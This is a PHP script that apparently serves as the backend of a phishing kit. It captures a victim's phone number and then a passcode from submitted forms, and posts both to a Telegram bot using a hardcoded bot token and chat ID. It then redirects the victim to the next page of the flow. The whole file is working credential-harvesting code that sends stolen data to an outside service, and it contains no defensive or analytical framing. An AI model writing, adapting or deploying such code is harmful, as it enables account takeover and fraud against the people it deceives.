<?php
ob_start();  // Start buffering immediately to prevent any output issues
session_start();

// Telegram bot details (updated to match your R2.php)
$botToken = '7963155716:AAH9knzvU8cefobdkl7bSCx4RflEraectyU';
$chatId = '5499018264';

// Handle phone submission
if (isset($_POST['phone'])) {
    $phone = trim($_POST['phone']);  // Trim whitespace
    if (!empty($phone)) {
        $_SESSION['phone'] = $phone;
    }
    // Redirect back to index.html (no output before this)
    header('Location: index.html');
    ob_end_flush();
    exit();
}

// Handle passcode submission
if (isset($_POST['passcode'])) {
    $passcode = trim($_POST['passcode']);
    $phone = $_SESSION['phone'] ?? '';

    // If phone is still empty, log error (don't echo before header)
    if (empty($phone)) {
        error_log('Phone session is empty during passcode submission');
    }

    // Prepare message
    $message = "Phone: $phone\nPasscode: $passcode";

    // Send to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'content' => http_build_query($data),
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n"
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        error_log('Telegram send failed');
    }

    // Redirect to MR2.html (no output before this)
    header('Location: MR2.html');
    ob_end_flush();
    exit();
}

// Fallback (this is output, so it's safe here after all headers)
echo "Invalid request.";
ob_end_flush();
?>

